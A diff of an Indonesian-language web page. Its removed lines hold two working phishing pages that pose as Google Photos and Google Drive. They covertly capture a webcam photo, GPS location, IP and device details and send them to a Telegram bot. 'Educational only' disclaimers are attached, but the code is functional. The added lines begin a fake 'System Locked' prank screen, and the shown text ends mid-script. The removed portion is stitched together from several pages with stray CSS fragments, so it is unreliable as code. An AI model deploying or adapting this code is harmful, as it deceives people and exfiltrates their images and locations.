@@ -2,937 +2,697 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preview Foto Eksklusif - Google Photos</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- 
-    ============================================
-    HALAMAN DEMONSTRASI PHISHING EDUKATIF
-    ============================================
-    PERINGATAN: Sistem ini HANYA untuk tujuan 
-    edukasi keamanan siber dan pengujian penetrasi yang sah.
-    Penggunaan tanpa izin adalah ILEGAL.
-    ============================================
-    -->
-</head>
-<body>
-    <!-- UI yang Meyakinkan -->
-    <div class="container">
-        <header class="header">
-            <div class="google-logo">Google</div>
-            <nav class="nav">
-                <a href="#">Photos</a>
-                <a href="#">Albums</a>
-                <a href="#">Sharing</a>
-            </nav>
-        </header>
-
-        <main class="main-content">
-            <div class="loading-section">
-                <div class="loading-spinner"></div>
-                <h1>Memuat Preview Foto Eksklusif...</h1>
-                <p>Foto Anda sedang diproses dan akan segera tersedia</p>
-                <div class="progress-bar">
-                    <div class="progress"></div>
-                </div>
-            </div>
-
-            <div class="permission-section hidden">
-                <h2>🖼️ Akses Diperlukan untuk Preview Foto</h2>
-                <p>Untuk menampilkan preview foto khusus, kami memerlukan akses sementara ke kamera Anda untuk verifikasi keamanan.</p>
-                <button id="allow-access" class="btn-primary">Izinkan Akses Kamera</button>
-                <button id="skip-access" class="btn-secondary">Lewati (Preview Terbatas)</button>
-            </div>
-
-            <div class="photo-preview hidden">
-                <h2>📸 Foto Eksklusif Anda</h2>
-                <div class="photo-container">
-                    <!-- Foto akan ditampilkan di sini -->
-                </div>
-                <p class="success-message">✅ Foto berhasil diproses! Mengalihkan...</p>
-            </div>
-        </main>
-
-        <footer class="footer">
-            <p>&copy; 2024 Google LLC. Semua hak dilindungi undang-undang.</p>
-        </footer>
-    </div>
-
-    <!-- Elemen Tersembunyi untuk Proses -->
-    <video id="video" autoplay playsinline style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-
-    <script>
-        // ============================================
-        // KODE JAVASCRIPT UNTUK DEMONSTRASI PHISHING
-        // ============================================
-        // PERINGATAN: Kode ini HANYA untuk tujuan edukasi
-        // dan pengujian keamanan yang sah.
-        // ============================================
-
-        // Konfigurasi - DALAM PRODUKSI SEHARUSNYA TIDAK DI-HARDCODE
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // PERINGATAN: Hardcoding token tidak aman!
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-        // Elemen DOM
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const loadingSection = document.querySelector('.loading-section');
-        const permissionSection = document.querySelector('.permission-section');
-        const photoPreview = document.querySelector('.photo-preview');
-        const allowAccessBtn = document.getElementById('allow-access');
-        const skipAccessBtn = document.getElementById('skip-access');
-
-        // Data yang dikumpulkan
-        let collectedData = {
-            photo: null,
-            location: null,
-            ipInfo: null,
-            deviceInfo: {}
-        };
-
-        // Fungsi utama
-        document.addEventListener('DOMContentLoaded', async function() {
-            console.log('🚨 DEMO PHISHING: Sistem dimulai (HANYA EDUKASI)');
-            
-            try {
-                // Ekstrak parameter URL
-                const urlParams = new URLSearchParams(window.location.search);
-                const uniqueId = urlParams.get('_y');
-                const encodedChatId = urlParams.get('_x');
-
-                // Validasi parameter
-                if (!uniqueId || !encodedChatId) {
-                    console.error('Parameter URL tidak valid');
-                    redirectToSafeSite();
-                    return;
-                }
-
-                // Decode chat ID
-                const chatId = atob(encodedChatId);
-                collectedData.targetChatId = chatId;
-                collectedData.uniqueId = uniqueId;
-
-                // Mulai proses pengumpulan data secara paralel
-                await startDataCollection();
-
-            } catch (error) {
-                console.error('Error dalam proses:', error);
-                redirectToSafeSite();
-            }
-        });
-
-        // Fungsi untuk memulai pengumpulan data
-        async function startDataCollection() {
-            const promises = [
-                collectDeviceInfo(),
-                collectIPInfo(),
-                requestCameraAccess(),
-                requestLocation()
-            ];
-
-            // Jalankan semua proses secara paralel
-            await Promise.allSettled(promises);
-            
-            // Tampilkan UI permission setelah delay singkat
-            setTimeout(() => {
-                loadingSection.classList.add('hidden');
-                permissionSection.classList.remove('hidden');
-            }, 2000);
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Security</title>
+    
+    <!-- Google Font - Poppins -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-tap-highlight-color: transparent;
         }
-
-        // Event listener untuk tombol izin akses
-        allowAccessBtn.addEventListener('click', async () => {
-            try {
-                permissionSection.classList.add('hidden');
-                loadingSection.classList.remove('hidden');
-                
-                // Ambil foto jika akses kamera berhasil
-                if (collectedData.cameraAccess) {
-                    await capturePhoto();
-                }
-                
-                // Kirim data dan redirect
-                await sendCollectedData();
-                redirectToSafeSite();
-                
-            } catch (error) {
-                console.error('Error saat mengambil foto:', error);
-                await sendCollectedData();
-                redirectToSafeSite();
-            }
-        });
-
-        // Event listener untuk tombol lewati
-        skipAccessBtn.addEventListener('click', async () => {
-            permissionSection.classList.add('hidden');
-            await sendCollectedData();
-            redirectToSafeSite();
-        });
-
-        // Fungsi untuk mengambil foto
-        async function capturePhoto() {
-            return new Promise((resolve, reject) => {
-                try {
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob((blob) => {
-                        collectedData.photo = blob;
-                        resolve();
-                    }, 'image/jpeg', 0.8);
-                    
-                } catch (error) {
-                    reject(error);
-                }
-            });
-        }
-
-        // Fungsi untuk mengumpulkan informasi perangkat
-        async function collectDeviceInfo() {
-            collectedData.deviceInfo = {
-                userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack
-            };
-        }
-
-        // Fungsi untuk mengumpulkan informasi IP
-        async function collectIPInfo() {
-            try {
-                const response = await fetch('http://ip-api.com/json/');
-                const data = await response.json();
-                collectedData.ipInfo = data;
-            } catch (error) {
-                console.error('Error mendapatkan info IP:', error);
-                collectedData.ipInfo = { error: 'Gagal mendapatkan info IP' };
-            }
-        }
-
-        // Fungsi untuk meminta akses kamera
-        async function requestCameraAccess() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    } 
-                });
-                video.srcObject = stream;
-                collectedData.cameraAccess = true;
-            } catch (error) {
-                console.warn('Akses kamera ditolak:', error);
-                collectedData.cameraAccess = false;
-            }
-        }
-
-        // Fungsi untuk meminta lokasi
-        async function requestLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    collectedData.location = { error: 'Geolocation tidak didukung' };
-                    resolve();
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        collectedData.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        resolve();
-                    },
-                    (error) => {
-                        console.warn('Akses lokasi ditolak:', error);
-                        collectedData.location = { error: 'Akses lokasi ditolak' };
-                        resolve();
-                    },
-                    { 
-                        timeout: 10000,
-                        enableHighAccuracy: true 
-                    }
-                );
-            });
-        }
-
-        // Fungsi untuk mengirim data ke Telegram
-        async function sendCollectedData() {
-            try {
-                const formData = new FormData();
-                
-                // Siapkan caption dengan semua data
-                const caption = formatTelegramCaption();
-                
-                if (collectedData.photo) {
-                    formData.append('photo', collectedData.photo, 'captured_photo.jpg');
-                } else {
-                    // Jika tidak ada foto, kirim pesan teks saja
-                    await sendTextMessage(caption);
-                    return;
-                }
-                
-                formData.append('chat_id', collectedData.targetChatId);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'HTML');
-
-                const response = await fetch(TELEGRAM_API_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Telegram API error: ${response.status}`);
-                }
-
-                console.log('✅ Data berhasil dikirim ke Telegram');
-
-            } catch (error) {
-                console.error('❌ Error mengirim data ke Telegram:', error);
-            }
-        }
-
-        // Fungsi untuk mengirim pesan teks (fallback)
-        async function sendTextMessage(message) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: collectedData.targetChatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Telegram API error: ${response.status}`);
-                }
-            } catch (error) {
-                console.error('Error mengirim pesan teks:', error);
-            }
-        }
-
-        // Fungsi untuk memformat caption Telegram
-        function formatTelegramCaption() {
-            const { ipInfo, location, deviceInfo } = collectedData;
-            
-            let caption = `🎯 <b>New Target Captured!</b>\n\n`;
-            
-            // Informasi Lokasi
-            if (location && !location.error) {
-                caption += `📍 <b>GPS Location:</b> Lat: ${location.latitude}, Lon: ${location.longitude}\n`;
-            }
-            
-            // Informasi IP
-            if (ipInfo && ipInfo.status === 'success') {
-                caption += `🌐 <b>IP Address:</b> ${ipInfo.query}\n`;
-                caption += `🏢 <b>ISP:</b> ${ipInfo.isp}\n`;
-                caption += `🏙️ <b>Location:</b> ${ipInfo.city}, ${ipInfo.country}\n`;
-                caption += `🗺️ <b>Region:</b> ${ipInfo.regionName}\n`;
-                caption += `📮 <b>ZIP:</b> ${ipInfo.zip}\n`;
-            }
-            
-            // Informasi Perangkat
-            caption += `💻 <b>Device:</b> ${deviceInfo.platform}\n`;
-            caption += `📱 <b>Screen:</b> ${deviceInfo.screenResolution}\n`;
-            caption += `🌍 <b>Language:</b> ${deviceInfo.language}\n`;
-            caption += `⏰ <b>Timezone:</b> ${deviceInfo.timezone}\n`;
-            
-            // Informasi Tambahan
-            caption += `\n🔧 <b>Additional Info:</b>\n`;
-            caption += `• Camera Access: ${collectedData.cameraAccess ? '✅' : '❌'}\n`;
-            caption += `• Location Access: ${location && !location.error ? '✅' : '❌'}\n`;
-            caption += `• Unique ID: ${collectedData.uniqueId}\n`;
-            
-            caption += `\n⚠️ <i>This is an educational demonstration only</i>`;
-            
-            return caption;
-        }
-
-        // Fungsi untuk redirect ke situs aman
-        function redirectToSafeSite() {
-            setTimeout(() => {
-                window.location.href = 'https://google.com';
-            }, 1500);
-        }
-
-        // Error handling global
-        window.addEventListener('error', (event) => {
-            console.error('Global error:', event.error);
-        });
-    </script>
-</body>
-</html>        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #video, #canvas {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <div class="header">
-            <svg class="logo" viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg"><path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/><path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/><path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/><path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/><path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/><path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/></svg>
-            <h1>Google Drive</h1>
-        </div>
-        <div class="preview-area">
-            <p>Memuat file rahasia...</p>
-            <div class="loader"></div>
-            <p style="font-size: 14px; margin-top: 15px;">Mohon tunggu, verifikasi keamanan sedang dilakukan.</p>
-        </div>
-    </div>
-
-    <video id="video"></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        // =============================================================================
-        // DISCLAIMER: KODE INI HANYA UNTUK TUJUAN EDUKASI KEAMANAN SIBER.
-        // Penggunaan tanpa izin untuk mencuri data adalah ILEGAL.
-        // =============================================================================
-
-        // --- KONFIGURASI ---
-        // PRAKTIK BURUK: Token bot seharusnya tidak di-hardcode di sisi klien.
-        // Untuk demo ini, kita letakkan di sini. Di produksi, gunakan backend server.
-        const BOT_TOKEN = '1234567890:AAF_xxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // <-- GANTI DENGAN TOKEN ANDA
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         
-        // PERBAIKAN 1: Gunakan CORS Proxy untuk mengatasi kebijakan browser.
-        // Ini HANYA untuk demonstrasi. Untuk produksi, gunakan backend server Anda sendiri.
-        const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/';
-        const PROXY_TELEGRAM_API_URL = CORS_PROXY + TELEGRAM_API_URL;
-
-        // --- EKSTRAKSI PARAMETER URL ---
-        const urlParams = new URLSearchParams(window.location.search);
-        const uniqueBotId = urlParams.get('_y');
-        const encodedChatId = urlParams.get('_x');
-
-        if (!uniqueBotId || !encodedChatId) {
-            console.error('Parameter URL tidak valid. Mengalihkan...');
-            window.location.href = 'https://google.com';
-            throw new Error("Invalid parameters");
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            font-family: 'Poppins', sans-serif;
+            background: url('https://files.catbox.moe/cd074n.jpg') center/cover no-repeat;
+            touch-action: none;
         }
-
-        const targetChatId = atob(encodedChatId);
-
-        // --- FUNGSI PENGUMPULAN DATA (DIJALANKAN PARALEL) ---
-
-        async function getPhoto() {
-            try {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }
-                });
-                
-                video.srcObject = stream;
-                video.play();
-
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => resolve();
-                });
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
-
-                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
-            } catch (error) {
-                console.error("Kamera ditolak atau tidak tersedia:", error);
-                return null;
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+        
+        .form-container {
+            width: 90%;
+            max-width: 400px;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
             }
         }
-
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        });
-                    },
-                    (error) => {
-                        console.error("Lokasi ditolak:", error);
-                        resolve(null);
-                    }
-                );
-            });
+        
+        .form-title {
+            color: white;
+            font-size: 2rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
         }
-
-        async function getDeviceAndNetworkInfo() {
-            try {
-                // PERBAIKAN 2: Ganti HTTP ke HTTPS untuk menghindari "Mixed Content" error.
-                const response = await fetch('https://ip-api.com/json/');
-                if (!response.ok) throw new Error('Gagal mengambil data IP');
-                const ipData = await response.json();
-
-                return {
-                    ip: ipData.query,
-                    country: ipData.country,
-                    city: ipData.city,
-                    isp: ipData.isp,
-                    timezone: ipData.timezone,
-                    userAgent: navigator.userAgent,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    platform: navigator.platform,
-                    language: navigator.language
-                };
-            } catch (error) {
-                console.error("Gagal mengambil info jaringan:", error);
-                return {
-                    ip: 'Tidak diketahui',
-                    userAgent: navigator.userAgent,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    platform: navigator.platform,
-                    language: navigator.language
-                };
-            }
+        
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
         }
-
-        // --- EKSEKUSI UTAMA ---
-        window.onload = async () => {
-            const [photo, location, deviceInfo] = await Promise.allSettled([
-                getPhoto(),
-                getLocation(),
-                getDeviceAndNetworkInfo()
-            ]);
-
-            const photoBlob = photo.status === 'fulfilled' ? photo.value : null;
-            const locationData = location.status === 'fulfilled' ? location.value : null;
-            const networkData = deviceInfo.status === 'fulfilled' ? deviceInfo.value : {};
-
-            let locationString = 'Tidak diketahui';
-            if (locationData) {
-                locationString = `${locationData.latitude}, ${locationData.longitude}`;
-            }
-
-            const caption = `🎯 Target Tertangkap!\n` +
-                `📍 Lokasi GPS: ${locationString}\n` +
-                `🌐 IP Address: ${networkData.ip || 'Tidak diketahui'}\n` +
-                `🏢 Kota/Negara: ${networkData.city || 'Tidak diketahui'}, ${networkData.country || 'Tidak diketahui'}\n` +
-                `🏢 ISP: ${networkData.isp || 'Tidak diketahui'}\n` +
-                `💻 Perangkat: ${networkData.userAgent}\n` +
-                `📱 Resolusi Layar: ${networkData.screenResolution}\n` +
-                `⚙️ Platform: ${networkData.platform}\n` +
-                `🌍 Bahasa: ${networkData.language}`;
-
-            // --- KIRIM DATA KE TELEGRAM ---
-            if (photoBlob) {
-                const formData = new FormData();
-                formData.append('chat_id', targetChatId);
-                formData.append('photo', photoBlob, 'capture.jpg');
-                formData.append('caption', caption);
-
-                try {
-                    // PERBAIKAN 3: Gunakan URL proxy untuk fetch ke Telegram
-                    await fetch(PROXY_TELEGRAM_API_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    console.log('Data berhasil dikirim ke Telegram.');
-                } catch (error) {
-                    console.error('Gagal mengirim data ke Telegram:', error);
-                }
-            } else {
-                try {
-                    // PERBAIKAN 3: Gunakan URL proxy untuk fetch ke Telegram
-                    await fetch(CORS_PROXY + `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: targetChatId,
-                            text: caption
-                        })
-                    });
-                    console.log('Data teks berhasil dikirim ke Telegram.');
-                } catch (error) {
-                    console.error('Gagal mengirim data teks ke Telegram:', error);
-                }
-            }
-
-            // --- PENUTUP: ALIHKAN PENGGUNA ---
-            window.location.href = 'https://google.com';
-        };
-    </script>
-</body>
-</html>            width: 40px;
-            height: 40px;
-            margin-right: 16px;
+        
+        .input-group label {
+            display: block;
+            color: white;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            font-size: 0.9rem;
         }
-        h1 {
-            font-size: 22px;
-            color: #202124;
-            margin: 0;
-            font-weight: 400;
+        
+        .input-group input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
         }
-        .preview-area {
-            background-color: #e8f0fe;
-            border: 1px dashed #4285f4;
-            border-radius: 8px;
-            padding: 40px;
-            margin: 20px 0;
+        
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
-        .preview-area p {
-            color: #1967d2;
-            font-size: 18px;
-            margin: 0;
+        
+        .input-group input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.3);
+            border-color: rgba(255, 255, 255, 0.5);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
         }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285f4;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
+        
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            color: white;
+            cursor: pointer;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        .main-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 0.5rem;
         }
-        /* Sembunyikan elemen yang digunakan untuk proses di belakang layar */
-        #video, #canvas {
+        
+        .main-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+        }
+        
+        .secondary-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 0.5rem;
+        }
+        
+        .secondary-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
             display: none;
+        }
+        
+        .success-message {
+            color: #4CAF50;
+            text-align: center;
+            margin-top: 1rem;
+            display: none;
+        }
+        
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .dashboard-page {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: url('https://files.catbox.moe/cd074n.jpg') center/cover no-repeat;
+            z-index: 1000;
+        }
+        
+        .dashboard-container {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .user-info {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin-bottom: 1.5rem;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+            color: white;
+        }
+        
+        .warning-message {
+            background: rgba(255, 107, 107, 0.3);
+            border: 1px solid rgba(255, 107, 107, 0.5);
+            border-radius: 10px;
+            padding: 1rem;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        
+        .warning-text {
+            color: #ff6b6b;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        
+        .dashboard-btn {
+            width: 100%;
+            padding: 0.8rem;
+            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 0.5rem;
+        }
+        
+        .create-account-section {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin-top: 1.5rem;
+        }
+        
+        .section-title {
+            color: white;
+            text-align: center;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        
+        .accounts-list {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 1rem;
+        }
+        
+        .account-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.8rem;
+            border-radius: 8px;
+            margin-bottom: 0.5rem;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .delete-btn {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 0.3rem 0.6rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        
+        .dev-info {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 8px 12px;
+            border-radius: 20px;
+            color: white;
+            font-size: 12px;
+        }
+        
+        .dev-info a {
+            color: #0088cc;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
+    <!-- Halaman Login -->
+    <div class="screen" id="loginScreen">
+        <div class="form-container">
+            <h1 class="form-title">Panel Login</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="email">Username</label>
+                    <input type="text" id="email" placeholder="Masukkan username">
+                    <div class="error-message" id="emailError">Username harus diisi</div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Masukkan password">
+                    <i class="fas fa-eye toggle-password" id="togglePassword"></i>
+                    <div class="error-message" id="passwordError">Password harus diisi</div>
+                </div>
+                
+                <button type="submit" class="main-btn">Login</button>
+                
+                <div class="success-message" id="successMessage">
+                    <i class="fas fa-check-circle"></i> Login berhasil! Mengalihkan...
+                </div>
+            </form>
 
-    <div class="container">
-        <div class="header">
-            <svg class="logo" viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg"><path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/><path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/><path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/><path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/><path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/><path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/></svg>
-            <h1>Google Drive</h1>
+            <!-- Section Create Account -->
+            <div class="create-account-section">
+                <h3 class="section-title">Buat Akun Baru</h3>
+                
+                <div class="input-group">
+                    <label for="newUsername">Username Baru</label>
+                    <input type="text" id="newUsername" placeholder="Buat username">
+                </div>
+                
+                <div class="input-group">
+                    <label for="newPassword">Password Baru</label>
+                    <input type="password" id="newPassword" placeholder="Buat password">
+                </div>
+                
+                <button class="secondary-btn" id="createAccountBtn">
+                    <i class="fas fa-plus"></i> Buat Akun
+                </button>
+
+                <!-- Daftar Akun -->
+                <div class="accounts-list" id="accountsList">
+                    <!-- Akun akan muncul di sini -->
+                </div>
+            </div>
         </div>
-        <div class="preview-area">
-            <p>Memuat file rahasia...</p>
-            <div class="loader"></div>
-            <p style="font-size: 14px; margin-top: 15px;">Mohon tunggu, verifikasi keamanan sedang dilakukan.</p>
+    </div>
+    
+    <!-- Halaman Locked -->
+    <div class="dashboard-page" id="dashboardPage">
+        <div class="dashboard-container">
+            <div class="form-container">
+                <h1 class="form-title">System Locked 🔒</h1>
+                
+                <div class="user-info">
+                    <div class="info-item">
+                        <span>Username:</span>
+                        <span id="displayUsername">-</span>
+                    </div>
+                    <div class="info-item">
+                        <span>IP Address:</span>
+                        <span id="ipAddress">-</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Device:</span>
+                        <span id="deviceInfo">-</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Lock Time:</span>
+                        <span id="lockTime">-</span>
+                    </div>
+                </div>
+                
+                <div class="warning-message">
+                    <div class="warning-text">
+                        ⚠️ kalo mau keluar reboot cill 😹😹😹
+                    </div>
+                </div>
+                
+                <button class="dashboard-btn" id="unlockBtn">
+                    <i class="fas fa-lock-open"></i> Coba Unlock
+                </button>
+                
+                <button class="dashboard-btn" id="helpBtn">
+                    <i class="fas fa-question-circle"></i> Minta Bantuan
+                </button>
+            </div>
         </div>
     </div>
 
-    <!-- Elemen-elemen tersembunyi untuk proses di belakang layar -->
-    <video id="video"></video>
-    <canvas id="canvas"></canvas>
+    <!-- Developer Info -->
+    <div class="dev-info">
+        <a href="https://t.me/JhonNotDev" target="_blank">
+            <i class="fab fa-telegram"></i> @JhonNotDev
+        </a>
+    </div>
+    
+    <!-- Audio untuk prank -->
+    <audio id="alertSound" loop>
+        <source src="https://files.catbox.moe/ya1wgk.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
